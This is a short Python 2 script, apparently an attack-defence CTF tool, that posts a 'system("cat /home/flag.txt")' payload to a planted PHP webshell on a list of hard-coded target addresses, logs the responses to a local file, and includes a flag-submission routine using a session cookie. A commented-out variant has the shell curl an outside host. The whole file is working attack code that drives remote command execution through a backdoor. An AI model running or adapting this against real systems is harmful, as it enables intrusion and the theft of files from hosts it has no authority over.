# coding:utf8
import requests
import time

def submit_flag(flag):
	# f = open('d:/flags.txt','rb')
    cookie =  "JSESSIONID=xyz"
    url='http://192.168.1.1:8080/SubmitFlagPage'
    # r = requests.post(url, headers={"Cookie":cookie})
    # csrf_token = re.findall(r'value=\"(.*?)\"', r.content)[0]#Find csrf_token in the real env if it exist
    # post_data = {"code":flag,'csrf':'csrf_token'}
    post_data = {"code":flag}
    r = requests.post(url, data=post_data, headers={"Cookie":cookie})
    print r.content
    succ = True

def get_flag(target_list):
	# 设置flag路径
	flag = '/home/flag.txt'
	# flag = 'http://10.10.1.152:8000/flag'
	# shell密码
	passwd = 'shell'
	# list_pass=['vf0k28','iamctfing','vf1dm0','vf87on','vfaioq']
	# payload={list_pass[i]:"echo system('curl http://10.10.1.152:8000/flag');" }

	payload = passwd + '=system("cat ' + flag + '");'
	headers={
		#"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:52.0) Gecko/20100101 Firefox/52.0",
		#"Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
		#"Accept-Language": "zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3",
		#"Accept-Encoding": "gzip, deflate"
		#"Connection: keep-alive",
		#"Upgrade-Insecure-Requests": "1",
		"Content-Type":"application/x-www-form-urlencoded"		# requests库会将内容url编码
	}
	# 本地文件存储flag
	cur_file = 'd:/' + time.strftime("%Y%m%d-%H-%M-%S", time.localtime()) + '-flag.txt'
	f = open(cur_file,'a')
	for url in target_list:
		# 要注意url
		# http://47.94.131.119:10000/uploadfile/2018/0815//20180815114405673.php
		url="http://"+url+"/uploadfile/2018/0815/webshell.php"
		try:
			HtmlContent=requests.post(url,headers=headers,data=payload)
			#filter=HtmleContent.text[HtmleContent.text.index("http://"):HtmleContent.text.index(".php")]
			#print filter
			print HtmlContent.text
			f.write(HtmlContent.text + '\n')
		except:
			pass
	f.close()

if __name__ == '__main__':
	target_list={
		"47.94.131.119:10000",
		"47.94.131.119:10001",
		"192.168.31.133",
	}
	get_flag(target_list)
	# 可将flag写入本地文件，用submit_flag函数读取文件提交flag